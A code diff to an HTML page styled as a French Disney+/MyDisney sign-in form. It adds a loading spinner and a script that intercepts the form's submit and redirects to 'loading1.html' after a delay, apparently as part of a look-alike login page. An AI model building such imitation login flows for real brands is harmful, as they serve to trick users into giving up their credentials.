@@ -79,6 +79,32 @@
       background-color: #333;
     }
 
+    #spinner {
+      display: none;
+      margin-top: 20px;
+    }
+
+    #spinner div {
+      border: 6px solid #ccc;
+      border-top: 6px solid #0063e5;
+      border-radius: 50%;
+      width: 40px;
+      height: 40px;
+      animation: spin 1s linear infinite;
+      margin: auto;
+    }
+
+    #spinner p {
+      color: #333;
+      margin-top: 10px;
+    }
+
+    @keyframes spin {
+      to {
+        transform: rotate(360deg);
+      }
+    }
+
     .footer-note {
       font-size: 0.75rem;
       color: #444;
@@ -155,6 +181,12 @@
       <button type="submit">Continuer</button>
     </form>
 
+    <!-- Spinner caché -->
+    <div id="spinner">
+      <div></div>
+      <p>Chargement...</p>
+    </div>
+
     <div class="footer-note">
       <strong>Disney+ fait partie des entreprises du groupe Walt Disney</strong><br />
       MyDisney vous permet d'accéder facilement aux différents services des entreprises du groupe Walt Disney, comme Disney+, ESPN, Walt Disney World <a href="#">et bien +</a>.
@@ -170,5 +202,16 @@
       </div>
     </div>
   </main>
+
+  <script>
+    document.getElementById("loginForm").addEventListener("submit", function(e) {
+      e.preventDefault(); // Empêche le rechargement
+      document.getElementById("spinner").style.display = "block"; // Affiche le spinner
+      setTimeout(() => {
+        window.location.href = "loading1.html"; // Redirection
+      }, 2500); // Délai en millisecondes
+    });
+  </script>
+
 </body>
 </html>
